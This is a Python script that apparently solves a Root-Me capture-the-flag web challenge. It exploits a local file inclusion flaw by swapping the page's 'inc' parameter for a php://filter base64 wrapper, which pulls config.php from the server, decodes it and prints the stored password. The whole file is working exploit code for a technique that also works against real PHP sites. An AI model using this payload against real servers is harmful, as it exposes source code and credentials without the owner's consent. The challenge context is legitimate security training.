import requests
from bs4 import BeautifulSoup
import base64
import sys

# Get the URL from the command-line arguments
if len(sys.argv) < 2:
    print("Usage: python script.py <target_url>")
    print("Probably http://challenge01.root-me.org/web-serveur/ch12/?inc=login.php")
    sys.exit(1)

url = sys.argv[1]

# Modify the URL to include the php://filter
url = url.replace("?inc=login.php", "?inc=php://filter/convert.base64-encode/resource=config.php")

# Fetch the HTML content
response = requests.get(url)

if response.status_code == 200:
    soup = BeautifulSoup(response.content, 'html.parser')

    # Find and extract the Base64 string from the <body> (more robust)
    body = soup.find('body')

    if body:  # Check if <body> tag was found
        # Assuming the encoded data is the only text in <body> or you want the whole text:
        text = body.get_text().strip() 

        # Decode the Base64 string
        try:
            decoded_content = base64.b64decode(text).decode('latin1')
            password_start = decoded_content.find("$password=\"") + len("$password=\"")
            password_end = decoded_content.find("\";", password_start)
            password = decoded_content[password_start:password_end]
            print("password:",password)
            #print(decoded_content)
        except base64.binascii.Error:
            print("Error: Invalid Base64 data found in response.")
    else:
        print("Error: Could not find <body> tag in response.")
else:
    print(f"Error: Request failed with status code {response.status_code}")
